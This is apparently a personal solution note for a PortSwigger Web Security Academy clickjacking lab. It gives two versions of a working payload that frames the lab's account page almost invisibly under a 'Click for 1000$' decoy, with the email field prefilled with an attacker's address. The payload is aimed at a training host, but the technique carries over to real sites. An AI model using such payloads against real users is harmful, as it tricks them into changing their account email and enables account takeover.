# Lab: Clickjacking with form input data prefilled from a URL parameter
# https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-clickjacking-with-prefilled-form-input/clickjacking/lab-prefilled-form-input#



```bash
# Open my account page. Change url to this and hit enter

https://0a20006f03c77dac826dbc320027003b.web-security-academy.net/my-account?email=a

# We see that a is in the email input box so we can use this.

```

```bash

# Deliver this to victim:
<style>
	iframe{
		position:relative;
		width: 1000px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	
	
	}

	div{
		position:absolute;
		top: 470px;
		left: 45px;
		z-index: 1;
	
	
	}

</style>

<div>Click for 1000$</div>
<iframe src="https://0a20006f03c77dac826dbc320027003b.web-security-academy.net/my-account?email=hackera@gmail.com"></iframe>

# If it doesn't work try this:


<style>
	iframe{
		position:relative;
		width: 700px;
		height: 500px;
		opacity: 0.0001;
		z-index: 2;
	
	
	}

	div{
		position:absolute;
		top: 450px;
		left: 80px;
		z-index: 1;
	
	
	}

</style>

<div>Test me</div>
<iframe src="https://0a20006f03c77dac826dbc320027003b.web-security-academy.net/my-account?email=hackedbybora@gmail.com"></iframe>

# Iframe labs are weird sometimes they don't accept true answers try to submit again later if it doesn't work.
```
